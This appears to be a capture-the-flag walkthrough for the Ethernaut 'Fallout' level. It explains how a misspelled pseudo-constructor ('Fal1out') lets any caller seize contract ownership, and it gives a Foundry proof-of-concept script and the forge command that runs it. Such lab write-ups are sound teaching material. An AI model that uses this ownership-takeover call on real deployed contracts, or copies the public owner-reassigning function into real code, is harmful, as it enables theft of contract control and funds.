@@ -1,0 +1,75 @@
+"This level teaches you about constructors in Solidity. Constructor's in older versions of Solidity to be precise. 
+The main objective of this level is to become the owner of the contract. Let's dive in. 
+Constructors are special functions that are executed at the beginning of the deployment of the contract and are only executed once. They can't be called by external or internal users after deployment and is only used to initialize the contract's state. 
+Up to Solidity 0.4.21, the keywords for constructor definition were a tad bit different. To define a constructor, you had to define a function with the same name as that of your contract. Here's how it looked:
+pragma solidity 0.4.21;
+
+contract Oldie {
+
+    uint randomvar;
+    function Oldie(uint _randomvar) public {     // Constructor
+        randomvar = _randomvar;
+    }
+}
+
+This method may introduce security issues as we'll be seeing it soon. 
+In newer versions of Solidity, you can't use the contract's name to define a constructor. You have to use the constructor keyword as shown below:
+constructor
+pragma solidity 0.4.22;
+
+contract NewCon {
+
+    uint randomvar;
+    constructor (uint _randomvar) public {    // New Constructor
+        randomvar = _randomvar;
+    }
+}
+
+When we go through the vulnerable code for this level, we'll note that there's an eerily looking function with a similar name as that of the contract but it is not exactly the same. From the comments above the function, it looks like it's a constructor. 
+/* constructor */
+function Fal1out() public payable {
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+}
+
+This function when called changes the owner to the address of the msg.sender and sets the allocations for the owner to msg.value sent with the transaction. We are only interested in the ownership part. 
+msg.sender
+msg.value
+Note that the name of the constructor is misspelled. If the Solidity version had been < 0.4.22 and if the name of this function would have been Fallout, we wouldn't be able to call it since it would have become a constructor. 
+< 0.4.22
+Fallout
+But since the name of the function is misspelled, this just makes it like any other function. And since the visibility is set to public, it means that any external user, as well as any function inside the contract, will be able to make a call to this function. Whoever calls this function will become the new owner of the contract. 
+public
+Here's what our PoC script will look like. 
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel02.sol"";
+
+contract POC is Script {
+    Fallout level2 = Fallout(0xDBDb61eF9B8422f67c2799Cd339840F2ba6f56cd);
+
+    function run() external {
+        vm.startBroadcast();
+
+        console.log(""Current Owner is: "", level2.owner()); // querying current owner
+        level2.Fal1out(); // calling the vulnerable function
+        console.log(""New Owner is: "", level2.owner()); // checking if the owner changed
+
+        vm.stopBroadcast();
+    }
+}
+
+Let's make use of Forge's console.log function to log data to the terminal while we transact. 
+console.log
+We'll execute the script using the following command:
+forge script ./script/level02.sol --private-key $PKEY --broadcast -vvvv --rpc-url $RPC_URL
+
+We are querying and logging the current owner, then executing the Fal1out() function, and then again querying the owner of the contract. It can be seen in the below screenshot that it went as expected. 
+Fal1out()
+0xEAce4b71CA1A128e8B562561f46896D55B9B0246 is my EOA wallet's address with which I spun a new instance. 
+0xEAce4b71CA1A128e8B562561f46896D55B9B0246
+Once we become the new owner, we can go ahead and submit the instance to finish the level. 
+
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry"
